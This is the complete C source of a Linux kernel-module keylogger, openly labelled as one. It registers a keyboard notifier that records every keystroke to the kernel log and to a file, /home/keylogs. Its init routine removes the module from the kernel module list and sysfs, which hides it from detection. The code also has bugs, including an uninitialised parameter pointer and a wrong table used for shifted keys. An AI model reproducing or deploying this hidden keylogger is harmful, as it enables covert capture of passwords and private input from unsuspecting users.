/*
 * Copyright (c) 2015, Fakhri Zulkifli <d0lph1n98@yahoo.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * * Redistributions of source code must retain the above copyright notice, this
 *   list of conditions and the following disclaimer.
 *
 * * Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * * Neither the name of LKM_KeyLogs nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for KERN_INFO */
#include <linux/init.h>		/* Needed for the macros */
#include <linux/keyboard.h>     /* Needed for the notifier_block */
#include <linux/semaphore.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

#define DRIVER_DESC   "A simple LKM based keylogger"
#define DRIVER_LICENSE "GPL"

static const char* keycode[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* keycodeShiftEnabled[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static int shiftEnabled = 0;
struct semaphore sem;

int keylogs(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct file *fp;
    mm_segment_t fs;
    loff_t offset = 0;
    char *filename = "/home/keylogs";
    struct keyboard_notifier_param *param = param;
  
    /*
     * This code is written for fun.
     * Warning: Reading and writing a file from within the kernel is a bad, bad thing to do. Never do it. Ever.
     *
     */
    
    fs = get_fs(); 
    set_fs(KERNEL_DS);
    fp = filp_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(fp)) {
        printk(KERN_ERR "Can't open file %s\n", filename);
        return -EACCES;
    }

    if (code == KBD_KEYCODE) {
        if (param->value == 42 || param->value == 54) {
            down(&sem);
            if (param->down)
                shiftEnabled = 1;
            else
                shiftEnabled = 0;
            up(&sem);
            return NOTIFY_OK;
        }

        if (param->down)
        {
            down(&sem);
            if (shiftEnabled == 0) {
                printk(KERN_INFO "%s \n", keycode[param->value]);
                vfs_write(fp, keycode[param->value], strlen(keycode[param->value]), &offset);
            } else {
                printk(KERN_INFO "%s \n", keycodeShiftEnabled[param->value]);
                vfs_write(fp, keycode[param->value], strlen(keycode[param->value]), &offset);
            }
            up(&sem);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogs_nb =
{
    .notifier_call = keylogs
};

static int __init keylogs_init(void)
{
    register_keyboard_notifier(&keylogs_nb);    // Non-blocking call
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    sema_init(&sem, 1);
    return 0;
}

static void __exit keylogs_exit(void)
{
    unregister_keyboard_notifier(&keylogs_nb);
    printk(KERN_INFO "Unregistered the keylogger module \n");
}

module_init(keylogs_init);
module_exit(keylogs_exit);
MODULE_LICENSE(DRIVER_LICENSE);
MODULE_DESCRIPTION(DRIVER_DESC);
